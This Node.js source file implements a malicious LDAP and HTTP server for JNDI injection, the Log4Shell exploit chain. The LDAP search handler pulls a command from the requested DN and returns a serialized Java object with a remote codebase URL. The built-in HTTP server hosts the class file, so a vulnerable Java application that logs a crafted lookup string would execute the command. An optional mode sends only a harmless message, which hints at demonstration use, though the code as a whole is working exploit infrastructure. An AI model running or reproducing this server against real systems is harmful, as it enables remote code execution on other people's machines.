const getConfig = require("./utils/config.js");
const { createMessageBuffer, createObjectBuffer } = require("./utils/buffers.js");
const { http: logHttp, ldap: logLdap } = require("./utils/debug.js");

const ldap = require("ldapjs");
const express = require("express");

function sendMessage(req, res, payload) {
	logLdap("sending message '%s' to log", payload);

	const buffer = createMessageBuffer(payload);

	res.send({
		dn: req.dn.toString(),
		attributes: {
			"javaClassName": "java.lang.String",
			"javaSerializedData": buffer,
		}
	});
}

function sendObject(config, req, res, command) {
	logLdap("sending object with command '%s' to be executed from log", command)

	const buffer = createObjectBuffer(command, config.className);

	res.send({
		dn: req.dn.toString(),
		attributes: {
			"javaClassName": config.className,
			"javaCodebase": "http://" + config.host + ":" + config.httpPort + "/codebase/",
			"javaSerializedData": buffer,
		}
	});
}

function handleLdapSearch(config, req, res) {
	try {
		const match = req.dn.toString().match(/cmd=(.+)/);
		if (match !== null) {
			const command = match[1];
			logLdap("handling LDAP request for command '%s'", command);

			if (config.sendMessage) {
				const message = "<user wants to execute command " + command + ">";
				sendMessage(req, res, message);
			} else {
				sendObject(config, req, res, command);
			}
		}
	} catch (error) {
		logLdap("failed to handle LDAP search: %O", error);
	} finally {
		res.end();
	}
}

function serveClassFile(app, className) {
	logHttp("now serving class file for %s", className);

	const path = className.replace("$", "\\$");
	app.use("/codebase/" + path + ".class", express.static(__dirname + "/..", {
		index: className + ".class",
	}));
}

async function start() {
	const config = await getConfig();

	const ldapServer = ldap.createServer();
	const app = express();

	ldapServer.search("", (req, res) => handleLdapSearch(config, req, res));

	ldapServer.listen(config.ldapPort, () => {
		logLdap("LDAP server listening on ldap://0.0.0.0:%d", config.ldapPort);
	});
	
	app.use((req, _, next) => {
		logHttp("%s %s: HTTP request from '%s'", req.method, req.path, req.headers["user-agent"]);
		next();
	});

	serveClassFile(app, config.className);

	app.listen(config.httpPort, () => {
		logHttp("HTTP server listening on http://0.0.0.0:%d", config.httpPort);
	});
}
start();